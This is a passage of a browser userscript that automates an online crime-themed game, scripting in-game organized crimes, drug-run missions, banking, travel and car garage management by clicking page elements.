        const savedLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '');
        const savedPosition = GM_getValue('TMN_OC_POSITION', '');
        const savedCarPref = GM_getValue('TMN_CAR_PREF', '');
        const startOCBtn = savedOCType === 'National Bank' ? $('#ctl00_main_btnStartOCRobBank') : savedOCType === 'Casino' ? $('#ctl00_main_btnStartOCRobCasino') : $('#ctl00_main_btnStartOCRobArmoury');
        const lblMsg = $('#ctl00_lblMsg');
        if (!savedScriptStates.OC) return;

        if (lblMsg.text().includes('jail')) {
            HandleJail();
        } else if (savedAutoOC == 'Lead OC' && startOCBtn[0]) {
            //ctl00_main_btnStartOCRobBank ctl00_main_btnStartOCRobCasino ctl00_main_btnStartOCRobArmoury
            LogCountdown(5000, 1000, 'Starting OC', () => startOCBtn.click());
        } else if (location.href.includes('store')) {
            if (location.href.includes('?p=w&r=organizedcrime&cat=weapon')) {
                LogCountdown(3000, 1000, 'Buying CheyTac', () => document.querySelector(`a[href='store.aspx?p=w&act=buy&cat=weapon&itemid=18&r=organizedcrime']`).click());
            } else if (location.href.includes('?p=w&r=organizedcrime&cat=explosive')) {
                LogCountdown(3000, 1000, 'Buying C4', () => document.querySelector(`a[href='store.aspx?p=w&act=buy&cat=explosive&itemid=9&r=organizedcrime']`).click());
            } else {
                LogCountdown(3000, 1000, 'Returning to OC', () => { location.href = 'organizedcrime.aspx' });
            }
        } else if (lblMsg.text().includes('successfully committed ')) {
            LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
        } else if (!lblMsg[0] || lblMsg.text().includes('successfully') || lblMsg.text().includes('Invitation has been sent')) {
            const amReady = $(`tr:contains('${TMN_PLAYER}') > td`).eq(3).text().includes('Ready');
            const curCity = $('#ctl00_userInfo_lblcity').text().trim();
            // const position = location.href.split('pos=')[1]; //2 Transporter 3 WeaponMaster 4 ExplosiveExpert
            const position = $(`tr:contains(${TMN_PLAYER})`).index();
            if (curCity != 'London') {
                LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
            } else if (amReady) {
                if (savedAutoOC == 'Lead OC') {
                    if ($('#ctl00_main_btnCommitOC').length) {
                        LogCountdown(3000, 1000, 'Committing OC', () => $('#ctl00_main_btnCommitOC')?.click());
                        return;
                    } else {
                        LogCountdown(5000, 1000, 'Not everyone is ready. Rechecking', () => { location.href = location.href.replace('#', '') });
                        return;
                    }
                } else {
                    LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
                }
            } else if (position == '1' && savedAutoOC == 'Lead OC') {
                const $nameBox = $('#ctl00_main_txtinvitename');
                const $roleList = $('#ctl00_main_roleslist');
                const $inviteBtn = $('#ctl00_main_btninvite');
                if ($nameBox && $roleList && $inviteBtn) {
                    const TP = savedLeadingInputs.transporter;
                    const WM = savedLeadingInputs.weaponmaster;
                    const EE = savedLeadingInputs.explosiveexpert;

                    const isOpen = sel => (($(sel)?.text() || '').toLowerCase().includes('open'));
                    const tryInvite = (name, roleValue, statusSel) => {
                        if (!name) return false;
                        if (!isOpen(statusSel)) return false;
                        $roleList.val(roleValue);
                        $nameBox.val(name);
                        LogCountdown(3000, 1000, `Inviting ${name} as ${roleValue}`, () => $inviteBtn.click());
                        return true;
                    };

                    if (tryInvite(TP,'Transporter', '#ctl00_main_lbltransporterstatus')) return;
                    if (tryInvite(WM, 'WeaponMaster', '#ctl00_main_lblweaponmasterstatus')) return;
                    if (tryInvite(EE, 'ExplosiveExpert', '#ctl00_main_lblexplosiveexpertstatus')) return;
                }
                const tpReady = $('#ctl00_main_lbltransporterstatus').text().includes('Ready');
                const wmReady = $('#ctl00_main_lblweaponmasterstatus').text().includes('Ready');
                const eeReady = $('#ctl00_main_lblexplosiveexpertstatus').text().includes('Ready');
                if (tpReady && wmReady && eeReady) {
                    $('#ctl00_main_securitydeviceslist').val(6);
                    LogCountdown(5000, 1000, 'Buying Laptop', () => $('#ctl00_main_btnBuySecurity').click());
                } else {
                    LogCountdown(5000, 1000, 'Not everyone is ready. Rechecking', () => { location.href = location.href.replace('#', '') });
                }
            } else if (position == '2') {
                let carToUse;
                const carsList = $('#ctl00_main_carslist');
                carsList.children().map((n, e) => {
                    if (!savedCarPref.includes('Worst')) {
                        if (e.textContent.includes(savedCarPref)) {
                            carToUse = e.value;
                        }
                    } else if (savedCarPref == 'Worst-to-Best') {
                        if (e.textContent.includes('Bentley Continental')) {
                            carToUse = e.value;
                            return;
                        } else if (e.textContent.includes('Audi RS6') && !carToUse) {
                            carToUse = e.value;
                        } else if (e.textContent.includes('Bentley Arnage') && !carToUse) {
                            carToUse = e.value;
                        }
                    } else if (savedCarPref == 'Best-to-Worst') {
                        if (e.textContent.includes('Bentley Arnage')) {
                            carToUse = e.value;
                        } else if (e.textContent.includes('Audi RS6') && !carToUse) {
                            carToUse = e.value;
                        } else if (e.textContent.includes('Bentley Continental') && !carToUse) {
                            carToUse = e.value;
                        }
                    }
                });
                if (!carToUse) return;
                carsList.val(carToUse);
                LogCountdown(5000, 1000, 'Choosing car', () => $('#ctl00_main_btnchoosecar').click());
            } else if (position == '3') {
                const weaponList = $('#ctl00_main_weaponslist');
                if (!weaponList.val()) {
                    LogCountdown(3000, 1000, 'Going to store', () => { location.href = 'store.aspx?p=w&r=organizedcrime&cat=weapon' });
                } else {
                    LogCountdown(5000, 1000, 'Choosing weapon', () => $('#ctl00_main_btnChooseWeapon').click());
                }
            } else if (position == '4') {
                const explosiveList = $('#ctl00_main_explosiveslist');
                if (!explosiveList.val()) {
                    LogCountdown(3000, 1000, 'Going to store', () => { location.href = 'store.aspx?p=w&r=organizedcrime&cat=explosive' });
                } else {
                    LogCountdown(5000, 1000, 'Choosing explosive', () => $('#ctl00_main_btnchooseexplosive').click());
                }
            }
        } else if (lblMsg.text().includes('Invalid invitation') || lblMsg.text().includes('You cannot do')) {
            LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
        }
    }

    function DTMScript() {
        const lblMsg = $('#ctl00_lblMsg').text();
        //You are in the wrong location, unable to travel, or are already in a DTM.
        const btnComplete = $('#ctl00_main_btnCompleteDTM')[0] || $('#ctl00_main_btnCommitDTM')[0];
        if (lblMsg.includes('jail')) {
            HandleJail();
        } else if ((!lblMsg[0] || lblMsg.includes('successfully accepted') || lblMsg.includes(`You've started `)) && ($('#ctl00_main_pnlDTMParticipant')[0] || $('#ctl00_main_pnlDTMLeader')[0])) {
            const leading = $('#ctl00_main_pnlDTMLeader')[0] || btnComplete;
            let quantity = leading && $('#ctl00_main_pnlDTMLeader')[0].textContent || $('#ctl00_main_pnlDTMParticipant')[0].textContent;
            quantity = quantity.split('carry is ')[1].split('\n')[0] * 1;
            const quantiyInput = $('#ctl00_main_tbDrugAmount')[0] && $('#ctl00_main_tbDrugAmount') || $('#ctl00_main_tbDrugLAmount');
            const buyBtn = $('#ctl00_main_btnBuyLDrugs')[0] || $('#ctl00_main_btnBuyDrugs')[0];
            if (leading) {
                if (!$('#btnAutomate')[0]) {
                    $(`<input type='button' value='Automate' id='btnAutomate'>`).insertAfter('#ctl00_main_btnInviteMember');
                    $('#btnAutomate').on('click', () => {
                        const participantInput = $('#ctl00_main_tbParticipant');
                        participantInput[0].value = participantInput[0].value == '' ? TMN_PIC : participantInput[0].value;
                        $('#ctl00_main_btnInviteMember').click();
                    });
                }
                const participantStatus = $('#ctl00_main_lblParticipantStatus').text();
                const commanderStatus = $('#ctl00_main_lbldCommanderStatus').text();
                if (participantStatus == 'Open') {
                    return;
                } else if (!participantStatus.includes('Ready')) {
                    LogCountdown(3000, 1000, 'Rechecking', () => { location.href = location.href.replace('#', '') });
                } else if (!commanderStatus.includes('Ready')) {
                    quantiyInput.val(quantity);
                    LogCountdown(3000, 1000, 'Buying drugs', () => buyBtn.click());
                } else {
                    if (btnComplete) {
                        LogCountdown(3000, 1000, 'Completing DTM', () => btnComplete.click());
                    }
                }
            } else if (buyBtn) {
                quantiyInput.val(quantity);
                LogCountdown(3000, 1000, 'Buying drugs', () => buyBtn.click());
            } else {
                location.href = defaultPage;
            }
        } else if (lblMsg.includes('successfully bought') || lblMsg.includes('Invalid request') || lblMsg.includes('wrong location') || lblMsg.includes('You successfully traveled') || btnComplete) {
            if (btnComplete) {
                LogCountdown(3000, 1000, 'Completing DTM', () => btnComplete.click());
            } else {
                LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
            }
        } else if (lblMsg.includes('has been invited to your DTM.')) {
            LogCountdown(3000, 1000, 'Reloading', () => { location.href = location.href.replace('#', '') });
        }
    }

    function AutoBank() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const amount = location.href.split('a=')[1];
        const lblMsg = $('#ctl00_lblMsg').text();
        const timeLeft = $('#ctl00_main_lblTimeLeft').text();
        const depositBtn = $('#ctl00_main_btndeposit');
        if (!savedScriptStates['Auto Bank']) return;

        if (lblMsg.includes('jail')) {
            HandleJail();
        } else if (lblMsg.includes('opened')) {
            GM_setValue('TMN_AUTO_BANK_TIME', Date.now() + 24 * 60 * 60000);
            LogCountdown(5000, 1000, 'Money deposited. Redirecting', () => { location.href = defaultPage; } );
        } else if (depositBtn.length) {
            $('#ctl00_main_txtbankamt').val(amount);
            LogCountdown(5000, 1000, 'Depositing money', () => depositBtn.click());
        } else {
            GM_setValue('TMN_AUTO_BANK_TIME', GetAvailableTime($('#ctl00_main_lblTimeLeft').text()));
            LogCountdown(5000, 1000, 'Withdraw not ready. Redirecting', () => { location.href = defaultPage; } );
        }
    }

    function AutoTravel() {
        const destination = location.href.split('d=')[1];
        const lblMsg = $('#ctl00_lblMsg').text();
        const welcomeMsg = $('#ctl00_main_lblWelcome').text();

        if (lblMsg.includes('jail')) {
            HandleJail();
        } else if (welcomeMsg.includes('Welcome') || lblMsg.includes('travel again')) {
            setTimeout(() => { location.href = defaultPage }, Math.random() * 2000 + 3000);
        } else {
            $(`label:contains(${destination})`).click();
            setTimeout(() => { $('#ctl00_main_btnTravelNormal').click() }, Math.random() * 2000 + 3000);
        }
    }

    function GarageCleanup() {
        //Cars are on the way to Sydney - Australia and will arrive in 00:30:00. $11,000 has been taken out of your account.
        const lblMsg = $('#ctl00_lblMsg');
        const city = $('#ctl00_userInfo_lblcity').text();
        const desiredCars = [ 'Bentley Continental', 'Audi RS6 Avant', 'Bentley Arnage' ];
        const availableCars = $('#ctl00_main_gvCars tr').slice(1);

        if (lblMsg?.text().includes('jail')) {
            setTimeout(() => { location.href = location.href.replace('#', '') }, 3000);
        } else if (lblMsg?.text().includes('repaired') || lblMsg?.text().includes('no repair needed')) {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            if (!city.includes('London')) {
                Transport();
            } else {
                Sell();
            }
        } else if (lblMsg?.text().includes('sold')) {
            setTimeout(() => { location.href = 'crimes.aspx?p=g' }, 3000);
        } else if (lblMsg?.text().includes('London')) {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            Sell();
        } else if (lblMsg?.text().includes('damaged')) {
            location.href = 'crimes.aspx?p=g';
        } else {
            Repair();
        }

        function Repair() {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            availableCars.each((n, e) => {
                const car = $(e).find('td:eq(1)').text();
                const carDamage = $(e).find('td:eq(4)').text().trim();
                if (desiredCars.includes(car) && carDamage !== '0%') $(e).find('input').prop('checked', true);
            });
            if ($('input:checked').length > 0) {
                setTimeout(() => { $('#ctl00_main_btnRepair').click(); }, 3000);
                return;
            } else {
                Transport();
            }
        }

        function Transport() {
            availableCars.each((n, e) => {
                const car = $(e).find('td:eq(1)').text();
                const carLocation = $(e).find('td:eq(5)').text().trim();
                if (desiredCars.includes(car) && !carLocation.includes('London')) $(e).find('input').prop('checked', true);
            });
            if ($('input:checked').length > 0) {
                $('#ctl00_main_ddlCities').val(5);
                setTimeout(() => {
                    $('#ctl00_main_btnTransport').click();
                }, 3000);
                return;
            } else {
                Sell();
            }
        }

        function Sell() {
            setTimeout(() => { $('#ctl00_main_btnSellDamaged').click(); }, 3000);
        }
    }
})();